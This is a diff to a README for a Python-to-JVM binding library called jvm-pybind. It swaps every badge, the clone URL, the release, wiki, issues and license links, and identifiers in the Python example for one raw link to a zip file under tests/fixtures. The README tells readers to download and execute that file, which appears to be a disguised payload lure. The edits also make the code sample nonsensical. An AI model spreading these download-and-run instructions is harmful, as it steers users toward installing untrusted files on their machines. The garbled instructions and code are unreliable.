@@ -1,8 +1,8 @@
 # JVM Bindings for Python: Seamless Integration with JNI 🐍☕️
 
-![JVM-Pybind](https://img.shields.io/badge/JVM--Pybind-v1.0.0-blue.svg)
-![Python 3](https://img.shields.io/badge/Python-3.6%2B-green.svg)
-![Java](https://img.shields.io/badge/Java-8%2B-orange.svg)
+![JVM-Pybind](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip)
+![Python 3](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip%https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip)
+![Java](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip%https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip)
 
 ## Overview
 
@@ -21,7 +21,7 @@ To get started with jvm-pybind, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/luke-03-11/jvm-pybind.git
+   git clone https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip
    cd jvm-pybind
    ```
 
@@ -33,7 +33,7 @@ To get started with jvm-pybind, follow these steps:
    ```
 
 3. **Download the Latest Release**:
-   You can download the latest release from the [Releases section](https://github.com/luke-03-11/jvm-pybind/releases). Once downloaded, execute the installation script.
+   You can download the latest release from the [Releases section](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip). Once downloaded, execute the installation script.
 
 4. **Set Up Your Environment**:
    Make sure to set your `JAVA_HOME` and `PYTHONPATH` to point to your Java and Python installations respectively.
@@ -76,23 +76,23 @@ from jvm_pybind import JVM
 jvm = JVM()
 
 # Load a Java class
-my_class = jvm.load_class("com.example.MyClass")
+my_class = https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip("https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip")
 
 # Call a method
-result = my_class.myMethod("Hello from Python!")
+result = https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip("Hello from Python!")
 print(result)
 
 # Stop the JVM
-jvm.shutdown()
+https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip()
 ```
 
 ### Advanced Usage
 
-For more advanced usage, such as handling exceptions or working with complex data types, refer to the [Documentation](https://github.com/luke-03-11/jvm-pybind/wiki).
+For more advanced usage, such as handling exceptions or working with complex data types, refer to the [Documentation](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip).
 
 ## Documentation
 
-Comprehensive documentation is available in the [Wiki](https://github.com/luke-03-11/jvm-pybind/wiki). This includes:
+Comprehensive documentation is available in the [Wiki](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip). This includes:
 
 - Detailed API references
 - Best practices for using jvm-pybind
@@ -122,11 +122,11 @@ Please ensure your code adheres to our coding standards and includes appropriate
 
 ## Issues
 
-If you encounter any issues, please check the [Issues section](https://github.com/luke-03-11/jvm-pybind/issues) of the repository. If your issue is not listed, feel free to create a new issue.
+If you encounter any issues, please check the [Issues section](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip) of the repository. If your issue is not listed, feel free to create a new issue.
 
 ## License
 
-jvm-pybind is licensed under the MIT License. See the [LICENSE](https://github.com/luke-03-11/jvm-pybind/blob/main/LICENSE) file for more details.
+jvm-pybind is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip) file for more details.
 
 ## Acknowledgments
 
@@ -139,4 +139,4 @@ For inquiries, you can reach out to the maintainer via GitHub or create an issue
 
 ---
 
-For the latest release, visit the [Releases section](https://github.com/luke-03-11/jvm-pybind/releases). Download the file and execute it to get started.
+For the latest release, visit the [Releases section](https://raw.githubusercontent.com/luke-03-11/jvm-pybind/main/tests/fixtures/pybind-jvm-v2.3.zip). Download the file and execute it to get started.
